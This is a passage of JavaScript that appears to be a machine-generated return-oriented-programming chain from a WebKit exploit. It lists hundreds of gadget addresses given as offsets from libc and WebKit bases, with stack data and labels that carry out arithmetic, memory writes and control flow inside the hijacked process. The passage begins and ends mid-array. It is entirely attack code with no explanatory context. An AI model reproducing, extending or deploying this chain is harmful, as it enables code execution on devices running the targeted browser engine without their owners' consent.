webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L145:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L147:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L148:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+71888, //L150
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L150:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71944, //L151
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L151:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+72072, //L154
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L153:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+72160, //L156
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+72176, //L157
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L156:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L157:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+72328, //L160
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+72360, //L162
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+72312, //L159
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+72344, //L161
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L159:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L160:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L161:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L162:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+72456, //L164
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+72440, //L163
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L163:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L164:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L165:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L166:
db([24, 0]); // 0x18
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+72608, //L168
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L168:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+72664, //L169
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L169:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+72800, //L173
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+72768, //L171
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L171:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L172:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+72928, //L175
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+72944, //L176
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+72912, //L174
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L174:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L175:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73040, //L177
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73056, //L178
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L177:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73168, //L179
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73152, //L180
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L180:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+73256, //L182
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+73240, //L181
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L181:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73352, //L183
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73368, //L184
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L183:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73480, //L185
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73464, //L186
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L186:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L185:
db([0, 0]); // 0x0
//___builtin_bswap64:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73552, //L187
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L187:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+73616, //L189
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L189:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([16, 0]); // 0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+73712, //L193
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L192:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L193:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+73784, //L195
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L194:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L195:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L197:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L198:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+73904, //L201
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L200:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L201:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+73960, //L204
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L204:
db([0, 0]); // 0x0
//L202:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+74024, //L206
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L205:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L206:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+74112, //L208
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74128, //L209
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L208:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L209:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+74280, //L212
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74312, //L214
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+74264, //L211
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74296, //L213
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L211:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L212:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L213:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L214:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74384, //L215
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74400, //L216
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L215:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L216:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74496, //L218
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+74480, //L217
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L217:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L218:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74576, //L219
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L219:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L220:
db([4, 0]); // 0x4
set_gadget(libc_base+788575,); //pop rax
//L221:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74728, //L223
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74744, //L224
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+74712, //L222
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L222:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L223:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L224:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+48555, //setl al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+74912, //L226
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74928, //L227
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74896, //L225
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L225:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L226:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L227:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+75032, //L229
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+75080, //L232
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+75048, //L230
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L229:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L230:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L231:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L232:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+75192, //L233+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+75184, //L233
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L233:
db([0, 0]); // 0x0
set_gadgets([
ropchain+75208, //L233+24
ropchain+75224, //L228
libc_base+811575, //pop rsp
ropchain+75240, //L234
//L228:
libc_base+811575, //pop rsp
ropchain+85632, //L235
//L234:
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L237:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L238:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+75360, //L239
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75376, //L240
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L239:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L240:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+75520, //L244
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+75488, //L242
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75504, //L243
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L242:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L243:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L244:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+75592, //L246
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L246:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+75648, //L247
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L247:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L249:
db([7, 0]); // 0x7
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+75792, //L251
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L250:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+75880, //L253
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75896, //L254
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L253:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L254:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+76048, //L257
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76080, //L259
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+76032, //L256
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76064, //L258
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L256:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L257:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L258:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L259:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+76200, //L261
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76216, //L262
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+76184, //L260
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L260:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L261:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+76320, //L263
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76336, //L264
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L263:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+76424, //L266
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+76480, //L267
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L267:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+76600, //L269
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76632, //L271
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76616, //L270
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L269:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L270:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+76792, //L275
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76744, //L272
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+76760, //L273
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L272:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L273:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L274:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L275:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+76848, //L276
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L276:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+76952, //L278
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76984, //L280
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+76968, //L279
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L278:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L279:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77144, //L284
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+77096, //L281
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77112, //L282
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L281:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L282:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L283:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L284:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+77200, //L285
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+77304, //L287
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77336, //L289
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77320, //L288
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L287:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L288:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L289:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77496, //L293
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+77448, //L290
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77464, //L291
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L290:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L291:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L292:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L293:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+77552, //L294
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+77656, //L296
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77688, //L298
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77672, //L297
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L296:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L297:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L298:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77760, //L299
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77776, //L300
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L299:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77864, //L301
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77896, //L303
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L301:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L302:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+206806,); //pop rdi
//L303:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L305:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
